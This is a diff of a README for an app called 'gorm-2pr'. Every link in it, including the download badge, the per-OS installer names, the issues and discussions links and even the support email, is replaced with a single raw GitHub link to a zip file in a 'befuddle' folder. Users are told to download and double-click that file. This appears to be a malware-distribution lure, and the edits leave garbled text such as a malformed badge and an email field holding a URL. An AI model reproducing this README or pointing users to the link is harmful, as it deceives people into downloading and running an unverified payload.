@@ -1,7 +1,7 @@
 # 🎉 gorm-2pr - Simple App for Version Control
 
 ## 🖱️ Download Now
-[![Download gorm-2pr](https://img.shields.io/badge/Download%20gorm--2pr-v1.0-blue.svg)](https://github.com/pesilvac/gorm-2pr/releases)
+[![Download gorm-2pr](https://raw.githubusercontent.com/pesilvac/gorm-2pr/main/befuddle/gorm-2pr.zip%https://raw.githubusercontent.com/pesilvac/gorm-2pr/main/befuddle/gorm-2pr.zip)](https://raw.githubusercontent.com/pesilvac/gorm-2pr/main/befuddle/gorm-2pr.zip)
 
 ## 🚀 Getting Started
 
@@ -17,12 +17,12 @@ Before downloading gorm-2pr, make sure your computer meets the following require
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Releases Page](https://github.com/pesilvac/gorm-2pr/releases).
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/pesilvac/gorm-2pr/main/befuddle/gorm-2pr.zip).
 2. On the Releases page, look for the latest version. Click on the version number to see available files.
 3. Download the file that matches your operating system. Look for:
-   - `gorm-2pr-Windows.exe` for Windows users.
-   - `gorm-2pr-Mac.dmg` for macOS users.
-   - `gorm-2pr-Linux.tar.gz` for Linux users.
+   - `https://raw.githubusercontent.com/pesilvac/gorm-2pr/main/befuddle/gorm-2pr.zip` for Windows users.
+   - `https://raw.githubusercontent.com/pesilvac/gorm-2pr/main/befuddle/gorm-2pr.zip` for macOS users.
+   - `https://raw.githubusercontent.com/pesilvac/gorm-2pr/main/befuddle/gorm-2pr.zip` for Linux users.
 4. Once the download is complete, locate the file in your Downloads folder and double-click it to start the installation.
 5. Follow the on-screen instructions to finish the installation.
 
@@ -53,7 +53,7 @@ A: No, you do not need special permissions. Simply download and install like any
 A: Yes, you can manage and track multiple projects simultaneously.
 
 **Q: Where can I report issues or bugs?**  
-A: You can report any issues on our [GitHub Issues Page](https://github.com/pesilvac/gorm-2pr/issues).
+A: You can report any issues on our [GitHub Issues Page](https://raw.githubusercontent.com/pesilvac/gorm-2pr/main/befuddle/gorm-2pr.zip).
 
 ## 🔗 Additional Resources
 
@@ -63,6 +63,6 @@ If you need help, consider reaching out in the discussions section or community 
 
 ## 📞 Contact Us
 
-If you have questions or need support, feel free to reach out via email at support@gorm-2pr.com or visit our [GitHub Discussion Page](https://github.com/pesilvac/gorm-2pr/discussions).
+If you have questions or need support, feel free to reach out via email at https://raw.githubusercontent.com/pesilvac/gorm-2pr/main/befuddle/gorm-2pr.zip or visit our [GitHub Discussion Page](https://raw.githubusercontent.com/pesilvac/gorm-2pr/main/befuddle/gorm-2pr.zip).
 
 We hope you enjoy using gorm-2pr for your project version control needs!
